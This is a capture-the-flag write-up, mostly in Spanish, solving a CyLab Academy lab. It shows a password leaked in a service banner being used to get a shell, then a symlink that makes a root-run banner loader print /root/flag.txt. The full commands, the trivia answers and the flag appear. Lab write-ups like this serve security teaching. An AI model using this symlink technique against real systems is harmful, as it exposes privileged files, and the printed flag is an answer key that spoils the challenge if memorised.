# DESCRIPCIÓN:
Can you abuse the banner? The server has been leaking some crucial information on chatelaine.cylabacademy.net 30129. Use the leaked information to get to the server.

To connect to the running application use nc chatelaine.cylabacademy.net 39144. From the above information abuse the machine and find the flag in the /root directory.

Do you know about symlinks?

Maybe some small password cracking or guessing

# SOLUCIÓN:
#### academy{b4nn3r_gr4bb1n9_su((3sfu11y_5f2334f1}

Primero, me conecté al puerto secundario (30129) en chatelaine.cylabacademy.net para sacar la contraseña filtrada, que fue My_Passw@rd_@1234. Después, entré al puerto principal del reto (39144), ingresé esa contraseña y respondí las preguntas de trivia con "DEF CON" y "John Draper" para obtener la shell. Ya adentro, borré el archivo original y creé un enlace simbólico llamado banner apuntando directo a /root/flag.txt. Por último, dejé esa sesión abierta, abrí una terminal nueva y me volví a conectar al puerto principal (39144); al intentar cargar el mensaje de bienvenida, el servidor siguió el enlace y me dio la bandera.
```

┌──(mony㉿Mony)-[~]
└─$ nc chatelaine.cylabacademy.net 30129
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
^C

┌──(mony㉿Mony)-[~]
└─$ nc chatelaine.cylabacademy.net 39144
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm banner
ln -s /root/flag.txt bannerrm banner


player@challenge:~$ rm banner
rm banner
rm: cannot remove 'banner': No such file or directory
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$
┌──(mony㉿Mony)-[~]
└─$
```

```
┌──(mony㉿Mony)-[~]
└─$ nc chatelaine.cylabacademy.net 39144
academy{b4nn3r_gr4bb1n9_su((3sfu11y_5f2334f1}

what is the password?

┌──(mony㉿Mony)-[~]
└─$
```

# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/